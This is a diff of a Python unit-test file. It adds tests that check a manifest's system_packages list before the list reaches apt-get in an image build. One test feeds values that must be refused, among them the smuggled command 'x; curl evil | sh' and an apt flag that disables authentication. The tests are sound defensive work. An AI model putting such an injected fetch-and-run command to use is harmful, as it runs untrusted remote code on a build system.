@@ -66,11 +66,42 @@ class Manifests(unittest.TestCase):
         self.assertEqual((r.returncode, r.stdout.strip()), (0, "npm ci"))
         self.assertIn("vesta_host.manifest install", (HERE.parent / "Dockerfile").read_text())
 
+    def test_system_packages(self):
+        m, problem = manifest.load(self.write(
+            "start: x\nsystem_packages: [chromium-headless-shell, fonts-dejavu-core]\n"))
+        self.assertIsNone(problem)
+        self.assertEqual(m.system_packages, ["chromium-headless-shell", "fonts-dejavu-core"])
+        self.assertEqual(manifest.load(self.write("start: x\n"))[0].system_packages, [])
+
+    def test_a_package_list_that_is_not_package_names_is_refused(self):
+        # The list reaches `apt-get install` unquoted in the image build.
+        for bad in ("[\"x; curl evil | sh\"]", "[\"--allow-unauthenticated\"]", "[\"Upper\"]", "a-string"):
+            m, problem = manifest.load(self.write(f"start: x\nsystem_packages: {bad}\n"))
+            self.assertIsNone(m, bad)
+            self.assertIn("system_packages", problem)
+            r = subprocess.run([sys.executable, "-m", "vesta_host.manifest", "system-packages",
+                                str(self.write(f"start: x\nsystem_packages: {bad}\n"))],
+                               capture_output=True, text=True, env={"PYTHONPATH": str(HOST)})
+            self.assertEqual((r.returncode, r.stdout), (1, ""), bad)
+
+    def test_the_build_reads_system_packages_through_it(self):
+        p = self.write("start: x\nsystem_packages: [fonts-dejavu-core]\n")
+        r = subprocess.run([sys.executable, "-m", "vesta_host.manifest", "system-packages", str(p)],
+                           capture_output=True, text=True, env={"PYTHONPATH": str(HOST)})
+        self.assertEqual((r.returncode, r.stdout.strip()), (0, "fonts-dejavu-core"))
+        self.assertIn("vesta_host.manifest system-packages", (HERE.parent / "Dockerfile").read_text())
+
+    def test_the_real_agent_manifest_loads(self):
+        m, problem = manifest.load(HERE.parent / "agent-src" / "vesta-agent.yaml")
+        self.assertIsNone(problem)
+        self.assertEqual((m.name, m.start), ("vesta-agent", "python -m vesta_agent"))
+        self.assertIn("chromium-headless-shell", m.system_packages)
+
 
 class HostStates(unittest.TestCase):
     def test_round_trip(self):
         p = Path(tempfile.mkdtemp()) / "host.json"
-        h = HostState(agent_mode="agent", stub_heartbeat=True, ha_mcp_mode="external", sidecar_reason="off", host_version="0.8.0")
+        h = HostState(agent_mode="agent", stub_heartbeat=True, sidecar_reason="off", host_version="0.8.0")
         h.write(p)
         self.assertEqual(HostState.read(p), h)
 
